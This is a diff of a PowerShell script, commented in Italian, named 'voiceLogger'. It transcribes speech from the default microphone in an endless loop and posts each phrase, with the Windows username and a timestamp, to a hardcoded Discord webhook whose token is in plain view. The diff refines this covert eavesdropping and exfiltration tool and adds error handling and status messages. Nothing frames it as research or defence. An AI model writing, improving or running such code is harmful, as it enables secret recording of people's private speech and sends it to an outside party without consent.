@@ -1,20 +1,28 @@
 function DC-Upload {
     [CmdletBinding()]
     param (
-        [parameter(Position=0,Mandatory=$False)]
+        [parameter(Position=0, Mandatory=$false)]
         [string]$text
     )
 
-    # Il tuo Webhook Discord
+    # Webhook Discord
     $dc = 'https://discord.com/api/webhooks/1370038152143831101/iN2bRBDfDdvTBDEk0ElyeUlObFuw8zmflue_XbZkaTYUL8rH87ZYvwozegioJSkj-um2'
 
-    $Body = @{
-        'username' = $env:username
-        'content'  = $text
-    }
+    if (-not [string]::IsNullOrWhiteSpace($text)) {
+        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        $username = $env:USERNAME
 
-    if (-not ([string]::IsNullOrEmpty($text))) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
+        $body = @{
+            username = "VoiceLogger"
+            content = "**🗣 Nuova frase registrata**`n👤 Utente: $username`n🕒 Ora: $timestamp`n📄 Testo: $text"
+        } | ConvertTo-Json -Depth 3
+
+        try {
+            Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json'
+            Write-Host "✅ Inviato a Discord"
+        } catch {
+            Write-Host "❌ Errore durante l'invio a Discord: $_"
+        }
     }
 }
 
@@ -25,24 +33,31 @@ function voiceLogger {
     $recognizer.LoadGrammar($grammar)
     $recognizer.SetInputToDefaultAudioDevice()
 
+    Write-Host "🎤 VoiceLogger attivo. Pronuncia qualcosa..."
+
     while ($true) {
-        $result = $recognizer.Recognize()
-        if ($result) {
-            $results = $result.Text
-            Write-Output $results
-            $log = "$env:tmp/VoiceLog.txt"
-            echo $results > $log
-            $text = get-content $log -raw
-            DC-Upload $text
+        try {
+            $result = $recognizer.Recognize()
+            if ($result -and $result.Text.Trim().Length -gt 0) {
+                $text = $result.Text
+                Write-Host "📝 Testo riconosciuto: $text"
 
-            # Usa una dichiarazione switch con la variabile $results
-            switch -regex ($results) {
-                '\bnote\b' {saps notepad}  # Se il comando è 'note', apri il notepad
-                '\bexit\b' {break}          # Se il comando è 'exit', esci dal ciclo
+                # Invia a Discord
+                DC-Upload $text
+
+                # Esegui comandi vocali speciali
+                switch -regex ($text.ToLower()) {
+                    '\bnote\b' { Start-Process notepad }
+                    '\bexit\b' { break }
+                }
             }
+        } catch {
+            Write-Host "⚠️ Errore nel riconoscimento vocale: $_"
         }
-    }
-    Clear-Content -Path $log
-}
 
+        Start-Sleep -Milliseconds 500  # Leggero delay per evitare spam del loop
+    }
+
+    Write-Host "🛑 VoiceLogger terminato."
+}
 voiceLogger
